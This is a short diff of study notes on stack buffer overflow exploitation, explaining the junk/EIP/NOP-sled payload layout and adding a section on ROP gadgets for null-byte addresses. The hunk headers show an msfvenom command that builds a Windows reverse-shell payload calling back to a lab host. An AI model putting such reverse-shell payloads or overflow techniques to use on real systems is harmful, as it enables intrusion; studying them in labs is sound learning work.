@@ -11,7 +11,7 @@ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6
 * payload = junk + shell\_addr + \(nops + shellcode\)
   * junk : is offset before the EIP overwritten.
   * shell\_addr : is the address which we overwrite on the EIP register.
-  * nops + shellcode : actual shell code address, we need to include nops for smooth execution of shellcode.
+  * \(nops + shellcode\) : actual shell code address, we need to include nops for smooth execution of shellcode. nops are part of shellcode
 
 ## Computing shell\_addr 
 
@@ -21,4 +21,12 @@ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6
   * We need ASLR disabled. address randomization for stack memory
   * We need no null byte in hardcoded address of \(nops + shellcode\).
   * We need the stack executable.
+
+2\) If shellcode address contain null byte.
+
+* We need to use ROP gadgets to solve it.
+* Requirements
+  * We need ASLR disabled. address randomization on stack
+  * We need the stack executable.
+  * ROP objects need to be present which do not have null byte in its address.
 
